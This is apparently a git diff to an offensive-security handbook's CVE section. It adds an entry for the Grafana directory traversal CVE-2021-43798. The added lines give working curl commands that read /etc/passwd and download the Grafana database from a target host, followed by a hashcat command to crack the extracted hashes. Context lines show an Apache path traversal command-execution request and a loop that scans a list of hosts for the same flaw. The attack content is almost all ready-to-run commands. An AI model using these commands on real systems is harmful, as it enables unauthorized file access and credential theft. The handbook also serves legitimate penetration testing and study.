@@ -12,6 +12,7 @@
 - [CVE-2020-1472: ZeroLogon PE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2020-1472-ZeroLogon-PE)
 - [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-3156-Sudo--sudoedit-LPE)
 - [CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-41773-CVE-2021-42013-CVE-2020-17519-Simples-Apache-Path-Traversal-0-day)
+- [CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-43798-Grafana-Directory-Traversal-and-Arbitrary-File-Read)
 - [CVE-2021-44228: Log4Shell RCE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-44228-Log4Shell-RCE-0-day)
 - [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-0847-Dirty-Pipe-LPE)
 - [CVE-2022-21675: Zip Slip](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-21675-Zip-Slip)
@@ -404,6 +405,23 @@ $ curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/
 
 ```c
 $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+```
+
+## CVE-2021-43798: Grafana Directory Traversal and Arbitrary File Read
+
+> https://vulncheck.com/blog/grafana-cve-2021-43798
+
+- Grafana 8.3.0
+
+```c
+$ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../etc/passwd' --path-as-is
+$ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
+```
+
+### Cracking Grafana Hashes
+
+```c
+$ hashcat -m 10900 <FILE> /usr/share/wordlists/rockyou.txt
 ```
 
 ## CVE-2021-44228: Log4Shell RCE (0-day)
